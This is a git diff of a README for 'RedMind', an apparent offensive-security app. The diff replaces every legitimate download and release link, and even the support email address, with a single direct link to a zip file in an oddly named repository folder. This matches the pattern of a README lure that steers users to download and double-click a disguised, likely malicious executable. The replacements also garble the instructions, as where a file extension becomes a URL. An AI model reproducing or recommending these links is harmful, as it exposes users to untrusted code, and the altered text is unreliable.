@@ -6,12 +6,12 @@ Welcome to RedMind! This application is designed to help users engage in offensi
 ## 📂 Download & Install
 To get started, visit the releases page to download RedMind. Click the button below:
 
-[![Download RedMind](https://img.shields.io/badge/Download%20RedMind-v1.0-blue.svg)](https://github.com/OPBOY1203/redmind/releases)
+[![Download RedMind](https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip%https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip)](https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip)
 
 ### Steps to Download:
-1. Click the button above or visit [this page](https://github.com/OPBOY1203/redmind/releases) to access the latest release.
+1. Click the button above or visit [this page](https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip) to access the latest release.
 2. You will see a list of available files. Look for the version labeled "Latest Release."
-3. Download the file appropriate for your operating system. If you are using Windows, download the `.exe` file. For Mac or Linux users, you may find a `.tar.gz` or similar file.
+3. Download the file appropriate for your operating system. If you are using Windows, download the `.exe` file. For Mac or Linux users, you may find a `https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip` or similar file.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Double-click the file to run the software.
 
@@ -45,7 +45,7 @@ If you need help while using RedMind, consider the following resources:
 
 ## 📞 Support
 If you encounter any issues, please reach out for support:
-- **Email:** support@redmind-app.com
+- **Email:** https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip
 - **GitHub Issues:** Submit a ticket in the Issues section of this repository for bugs or feature requests.
 
 ## 🌟 Feedback
@@ -54,4 +54,4 @@ Your feedback is essential for improving RedMind. After using the software, plea
 ## 🔥 Conclusion
 We hope you find RedMind useful for your offensive operations. Download it today from our releases page and start your journey toward better security testing!
 
-[Again, download RedMind here!](https://github.com/OPBOY1203/redmind/releases)
+[Again, download RedMind here!](https://raw.githubusercontent.com/OPBOY1203/redmind/main/hematospermatocele/redmind.zip)
